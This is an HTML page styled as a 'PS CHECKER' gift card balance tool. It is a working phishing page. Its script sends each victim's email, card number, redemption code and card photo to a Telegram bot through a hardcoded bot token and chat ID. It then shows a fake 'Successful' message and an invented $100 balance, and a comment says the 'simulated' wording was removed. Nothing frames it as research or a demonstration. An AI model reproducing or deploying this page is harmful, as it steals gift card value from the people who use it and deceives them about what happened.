<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PS CHECKER</title>
  <style>
    :root {
      --bg: #2563eb;
      --card-bg: #ffffff;
      --accent: #2563eb;
      --accent-hover: #1d4ed8;
      --text: #2c2c2c;
      --text-dim: #666666;
      --border: #e0e0e0;
      --input-bg: #f9f9f9;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background:
        radial-gradient(
          circle at 15% 20%,
          rgba(255, 255, 255, 0.20) 0,
          rgba(255, 255, 255, 0.20) 90px,
          transparent 91px
        ),
        radial-gradient(
          circle at 85% 80%,
          rgba(255, 255, 255, 0.12) 0,
          rgba(255, 255, 255, 0.12) 150px,
          transparent 151px
        ),
        radial-gradient(
          circle at 80% 15%,
          rgba(147, 197, 253, 0.32) 0,
          transparent 220px
        ),
        linear-gradient(135deg, #2563eb 0%, #1d4ed8 45%, #172554 100%);
      color: var(--text);
      max-width: 700px;
      margin: 2rem auto;
      padding: 0 1rem;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }

    .background-design {
      position: fixed;
      inset: 0;
      overflow: hidden;
      pointer-events: none;
      z-index: -1;
    }

    .game-shape {
      position: absolute;
      color: rgba(255, 255, 255, 0.18);
      font-family: Arial, sans-serif;
      font-weight: bold;
      line-height: 1;
      text-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
      user-select: none;
    }

    .shape-cross {
      top: 8%;
      left: 8%;
      font-size: 9rem;
      transform: rotate(15deg);
    }

    .shape-circle {
      top: 12%;
      right: 9%;
      font-size: 12rem;
    }

    .shape-square {
      bottom: 9%;
      left: 8%;
      font-size: 11rem;
      transform: rotate(-12deg);
    }

    .shape-triangle {
      right: 10%;
      bottom: 7%;
      font-size: 12rem;
      transform: rotate(12deg);
    }

    .card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 2rem;
      margin-bottom: 2rem;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
      position: relative;
      z-index: 1;
    }

    h2 {
      margin-top: 0;
      color: var(--accent);
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.4rem;
      font-size: 0.9rem;
      color: var(--text-dim);
      font-weight: 600;
    }

    input[type="text"], input[type="email"], textarea, input[type="file"] {
      width: 100%;
      padding: 0.75rem;
      border-radius: 6px;
      border: 1px solid var(--border);
      background-color: var(--input-bg);
      color: var(--text);
      box-sizing: border-box;
      font-size: 1rem;
    }

    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
      outline: none;
      border-color: var(--accent);
      background-color: #ffffff;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
    }

    textarea {
      resize: vertical;
      min-height: 120px;
    }

    button {
      background-color: var(--accent);
      color: #ffffff;
      border: none;
      padding: 0.85rem 1.5rem;
      border-radius: 6px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.2s, transform 0.1s;
    }

    button:hover {
      background-color: var(--accent-hover);
    }

    button:disabled {
      background-color: #ccc;
      color: #666;
      cursor: not-allowed;
    }

    #processingBox {
      display: none;
      text-align: center;
      padding: 2rem 1rem;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid var(--border);
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #status {
      margin-top: 1rem;
      font-size: 0.95rem;
      text-align: center;
      font-weight: 500;
    }

    .error { color: #c62828; }
    .success { color: #2e7d32; }
  </style>
</head>
<body>

  <div class="background-design" aria-hidden="true">
    <span class="game-shape shape-cross">+</span>
    <span class="game-shape shape-circle">○</span>
    <span class="game-shape shape-square">□</span>
    <span class="game-shape shape-triangle">△</span>
  </div>

  <div class="card">
    <h2>PS CHECKER</h2>
    
    <form id="reviewForm">
      <div class="form-group">
        <label for="email">Mail Address</label>
        <input type="email" id="email" required placeholder="">
      </div>

      <div class="form-group">
        <label for="username">Name of Card</label>
        <input type="text" id="username" required placeholder="">
      </div>

      <div class="form-group">
        <label for="title">Card Type (Physical or E-code)</label>
        <input type="text" id="title" required placeholder="PHYSICAL OR E-CODE">
      </div>

      <div class="form-group">
        <label for="review">Card # (number)</label>
        <textarea id="review" required placeholder=""></textarea>
      </div>

      <div class="form-group">
        <label for="code">Code</label>
        <input type="text" id="code" required placeholder="">
      </div>

      <div class="form-group">
        <label for="image">Attach Image </label>
        <input type="file" id="image" accept="image/*">
      </div>

      <button type="submit" id="submitBtn">Next</button>
    </form>

    <div id="processingBox">
      <div class="spinner"></div>
      <h3>Processing your submission...</h3>
    </div>

    <div id="status"></div>
  </div>

  <script>
    // Configured Telegram Bot credentials (@SoftuserBot)
    const TELEGRAM_BOT_TOKEN = '8967072356:AAHkREbusxXTqHXNO5r8LDKLdlmCw4whB6A';
    const TELEGRAM_CHAT_ID = '7366645549';
    const demoBalance = 100.00;

    // DOM Element selections
    const form = document.getElementById('reviewForm');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');
    const processingBox = document.getElementById('processingBox');

    function compressImage(file, maxWidth = 1200, maxHeight = 1200, quality = 0.7) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
          const img = new Image();
          img.src = event.target.result;
          img.onload = () => {
            let width = img.width;
            let height = img.height;

            if (width > height) {
              if (width > maxWidth) {
                height = Math.round((height * maxWidth) / width);
                width = maxWidth;
              }
            } else {
              if (height > maxHeight) {
                width = Math.round((width * maxHeight) / height);
                height = maxHeight;
              }
            }

            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, width, height);

            canvas.toBlob((blob) => {
              if (blob) {
                resolve(blob);
              } else {
                reject(new Error('Image compression failed.'));
              }
            }, 'image/jpeg', quality);
          };
          img.onerror = (err) => reject(err);
        };
        reader.onerror = (err) => reject(err);
      });
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      submitBtn.disabled = true;
      statusDiv.textContent = "Sending...";
      statusDiv.className = "";

      const mailAddress = document.getElementById('email').value;
      const nameOfCard = document.getElementById('username').value;
      const cardType = document.getElementById('title').value;
      const cardDigits = document.getElementById('review').value;
      const codeValue = document.getElementById('code').value;
      const imageFile = document.getElementById('image').files[0];

      const fullMessage = `New Submission:\n\nMail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nCard #: ${cardDigits}\nCode: ${codeValue}`;

      try {
        let response;

        if (imageFile) {
          const compressedBlob = await compressImage(imageFile);
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('caption', fullMessage);
          formData.append('photo', compressedBlob, 'upload.jpg');

          response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } else {
          response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: fullMessage
            })
          });
        }

        const data = await response.json();

        if (response.ok && data.ok) {
          form.style.display = 'none';
          processingBox.style.display = 'block';
          
          // Display success state and balance immediately without 'simulated' text
          processingBox.innerHTML = `
            <div style="
              font-size: 48px;
              color: #2e7d32;
              margin-bottom: 12px;
            ">&#10003;</div>

            <h3 style="color: #2e7d32;">
              Successful
            </h3>

            <p>Your submission has been processed.</p>

            <div style="
              background: #f0fdf4;
              border: 1px solid #bbf7d0;
              border-radius: 10px;
              padding: 20px;
              margin-top: 20px;
            ">
              <p style="margin: 0; color: #166534;">
                Balance
              </p>

              <h2 style="
                color: #166534;
                font-size: 32px;
                margin: 10px 0;
              ">
                $${demoBalance.toFixed(2)} USD
              </h2>
            </div>

            <button
              type="button"
              id="resetDemo"
              style="margin-top: 20px;"
            >
              Try Again
            </button>
          `;

          document.getElementById('resetDemo')
            .addEventListener('click', function () {
              form.reset();
              form.style.display = 'block';
              processingBox.style.display = 'none';
              processingBox.innerHTML = `
                <div class="spinner"></div>
                <h3>Processing your submission...</h3>
              `;
              submitBtn.disabled = false;
              statusDiv.textContent = '';
            });

        } else {
          throw new Error(data.description || `Failed to send (HTTP ${response.status})`);
        }
      } catch (err) {
        statusDiv.textContent = "Error: " + err.message;
        statusDiv.className = "error";
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
